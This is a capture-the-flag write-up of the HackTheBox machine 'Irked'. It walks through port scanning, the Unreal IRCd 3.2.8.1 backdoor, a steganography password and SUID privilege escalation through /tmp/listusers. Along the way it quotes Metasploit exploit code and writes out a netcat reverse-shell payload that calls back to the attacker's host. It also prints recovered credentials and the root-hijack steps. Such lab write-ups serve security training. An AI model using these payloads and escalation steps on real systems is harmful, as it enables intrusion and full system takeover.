---
title: Irked
tags:
  - HackTheBox
  - Easy
  - Linux
  - IRC
  - Unreal_IRCD
  - Stego
  - SUID
---
![](Pasted%20image%2020241125224056.png)

## Reconnaissance

First, I added the new host to my known ones:

```shell
sudo echo "10.10.10.117 irked.htb" | sudo tee -a /etc/hosts
```

Then, I performed a Nmap scan:

```shell
nmap -sC -T4 -p- irked.htb > sC.txt

[redacted]
PORT      STATE SERVICE
22/tcp    open  ssh
| ssh-hostkey: 
|   1024 6a:5d:f5:bd:cf:83:78:b6:75:31:9b:dc:79:c5:fd:ad (DSA)
|   2048 75:2e:66:bf:b9:3c:cc:f7:7e:84:8a:8b:f0:81:02:33 (RSA)
|   256 c8:a3:a2:5e:34:9a:c4:9b:90:53:f7:50:bf:ea:25:3b (ECDSA)
|_  256 8d:1b:43:c7:d0:1a:4c:05:cf:82:ed:c1:01:63:a2:0c (ED25519)
80/tcp    open  http
|_http-title: Site doesn't have a title (text/html).
111/tcp   open  rpcbind
| rpcinfo: 
|   program version    port/proto  service
|   100000  2,3,4        111/tcp   rpcbind
|   100000  2,3,4        111/udp   rpcbind
|   100000  3,4          111/tcp6  rpcbind
|   100000  3,4          111/udp6  rpcbind
|   100024  1          40132/tcp6  status
|   100024  1          50639/udp6  status
|   100024  1          55130/tcp   status
|_  100024  1          57734/udp   status
6697/tcp  open  ircs-u
8067/tcp  open  infi-async
55130/tcp open  status
65534/tcp open  unknown
```

I noticed something interesting at port `111`: rcpbind, so I enumerated it:

```shell
rpcinfo irked.htb

program version netid     address                service    owner
    100000    4    tcp6      ::.0.111               portmapper superuser
    100000    3    tcp6      ::.0.111               portmapper superuser
    100000    4    udp6      ::.0.111               portmapper superuser
    100000    3    udp6      ::.0.111               portmapper superuser
    100000    4    tcp       0.0.0.0.0.111          portmapper superuser
    100000    3    tcp       0.0.0.0.0.111          portmapper superuser
    100000    2    tcp       0.0.0.0.0.111          portmapper superuser
    100000    4    udp       0.0.0.0.0.111          portmapper superuser
    100000    3    udp       0.0.0.0.0.111          portmapper superuser
    100000    2    udp       0.0.0.0.0.111          portmapper superuser
    100000    4    local     /run/rpcbind.sock      portmapper superuser
    100000    3    local     /run/rpcbind.sock      portmapper superuser
    100024    1    udp       0.0.0.0.225.134        status     107
    100024    1    tcp       0.0.0.0.215.90         status     107
    100024    1    udp6      ::.197.207             status     107
    100024    1    tcp6      ::.156.196             status     107

```

### Portmapper

>[!Info]
>**Portmapper** is a service that is utilized for mapping network service ports to **RPC** (Remote Procedure Call) program numbers. It acts as a critical component in **Unix-based systems**, facilitating the exchange of information between these systems. The **port** associated with **Portmapper** is frequently scanned by attackers as it can reveal valuable information. This information includes the type of **Unix Operating System (OS)** running and details about the services that are available on the system. Additionally, **Portmapper** is commonly used in conjunction with **NFS (Network File System)**, **NIS (Network Information Service)**, and other **RPC-based services** to manage network services effectively.
>
>**Default port:** 111/TCP/UDP, 32771 in Oracle Solaris

I didn't find anything from here, so I checked the port 80 and looked at the website:

![](Pasted%20image%2020241125225219.png)

It says that IRC is almost working, so might be an IRC channel on the back (note that there's also port `8067` in use):

```shell
irssi -c irked.htb --port 8067
```

![](Pasted%20image%2020241125225505.png)

We can notice that the Unreal IRCD version is 3.2.8.1

## Weaponization

If we search in google "*Unreal IRCD 3.2.8.1 exploit*" we find the following [Metasploit exploit](https://github.com/rapid7/metasploit-framework/blob/master/modules/exploits/unix/irc/unreal_ircd_3281_backdoor.rb)

It has the following function:

```ruby
def exploit
	connect

	print_status("Connected to #{rhost}:#{rport}...")
	banner = sock.get_once(-1, 30)
	banner.to_s.split("\n").each do |line|
			print_line("    #{line}")
	end

	print_status("Sending backdoor command...")
	sock.put("AB;" + payload.encoded + "\n")

	handler
	disconnect
end
```

It seems that the exploit first connects to the target, sends `AB;` + perl shell + `\n` 

## Exploitation

Basically, I can connect with netcat to the machine, execute the previous payload and get a reverse shell.

```shell
# On my machine (first set up listener)
nc -lvp 666
# Then connect to the machine with nc in other window (port 6697)
nc irked.htb 6697
# In other window capture ICMP traffic connection
sudo tcpdump -ni tun0 icmp
# Send the payload over nc
AB; rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.28 666 >/tmp/f;
```

![](Pasted%20image%2020241125230844.png)

> We've got a reverse shell :D

## Lateral Movement

Inspecting the `/home` directory I found the following:

```shell
ls -la /home/djmardov/Documents/
total 12
drwxr-xr-x  2 djmardov djmardov 4096 Sep  5  2022 .
drwxr-xr-x 18 djmardov djmardov 4096 Sep  5  2022 ..
-rw-r--r--  1 djmardov djmardov   52 May 16  2018 .backup
lrwxrwxrwx  1 root     root       23 Sep  5  2022 user.txt -> /home/djmardov/user.txt
```

```shell
cat .backup 

Super elite steg backup pw
UPupDOWNdownLRlrBAbaSSss
```

Think I got the some steganography challenge. I think that this pass might be the one for the initial image at the website:

```shell
wget http://irked.htb/irked.jpg
# Then extract the content
steghide extract -sf irked.jpg

cat pass.txt                                                 
Kab6h+m+bbp2J:HG
```

So now I got creds: `djmardov:Kab6h+m+bbp2J:HG`

> Got user flag :)

![](Pasted%20image%2020241125232326.png)

## Privilege Escalation

I manually enumerated SUID binaries:

```shell
find / -type f -perm -4000 2>/dev/null
[redacted]
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/eject/dmcrypt-get-device
/usr/lib/policykit-1/polkit-agent-helper-1
/usr/lib/openssh/ssh-keysign
/usr/lib/spice-gtk/spice-client-glib-usb-acl-helper
/usr/sbin/exim4
/usr/sbin/pppd
/usr/bin/chsh
/usr/bin/procmail
/usr/bin/gpasswd
/usr/bin/newgrp
/usr/bin/at
/usr/bin/pkexec
/usr/bin/X
/usr/bin/passwd
/usr/bin/chfn
/usr/bin/viewuser
/sbin/mount.nfs
/bin/su
/bin/mount
/bin/fusermount
/bin/ntfs-3g
/bin/umount
```

I noticed one that it's not a Debian default:

![](Pasted%20image%2020241125232908.png)

I don't know what that is, so I executed `file /usr/bin/viewuser`:

![](Pasted%20image%2020241125233059.png)

Seems to be some kind of ELF program. I'll copy it to my machine using **scp**:

```shell
scp djmardov@irked.htb:/usr/bin/viewuser ./binary_viewuser
```

Now execute ltrace to see what the binary did:

```shell
ltrace ./binary_viewuser

__libc_start_main([ "./binary_viewuser" ] <unfinished ...>
puts("This application is being devleo"...This application is being devleoped to set and test user permissions
)         = 69
puts("It is still being actively devel"...It is still being actively developed
)         = 37
system("who"gitblanc tty7         2024-11-25 22:37 (:0)
gitblanc pts/1        2024-11-25 22:39
 <no return ...>
--- SIGCHLD (Child exited) ---
<... system resumed> )                              = 0
setuid(0)                                           = -1
system("/tmp/listusers"sh: 1: /tmp/listusers: not found
 <no return ...>
--- SIGCHLD (Child exited) ---
<... system resumed> )                              = 32512
+++ exited (status 0) +++
```

So if I execute it:

```shell
viewuser

This application is being devleoped to set and test user permissions
It is still being actively developed
(unknown) :0           2024-11-25 16:40 (:0)
djmardov pts/1        2024-11-25 17:22 (10.10.14.28)
sh: 1: /tmp/listusers: not found
```

It says that `/tmp/listusers` is not found. I'll create it:

```shell
echo "test" > /tmp/listusers
viewuser

This application is being devleoped to set and test user permissions
It is still being actively developed
(unknown) :0           2024-11-25 16:40 (:0)
djmardov pts/1        2024-11-25 17:22 (10.10.14.28)
sh: 1: /tmp/listusers: Permission denied
```

Now I get a permission denied. I'll add execute permissions to `/tmp/listusers`:

```shell
chmod +x /tmp/listusers
echo id > /tmp/listusers
viewuser

This application is being devleoped to set and test user permissions
It is still being actively developed
(unknown) :0           2024-11-25 16:40 (:0)
djmardov pts/1        2024-11-25 17:22 (10.10.14.28)
uid=0(root) gid=1000(djmardov) groups=1000(djmardov),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),108(netdev),110(lpadmin),113(scanner),117(bluetooth)
```

Well, now I can execute commands as `root`. I can get a reverse shell like:

```shell
printf '/bin/sh' > /tmp/listusers
viewuser
# Now you are root
```

![](Pasted%20image%2020241125234420.png)

==Machine pwned!==
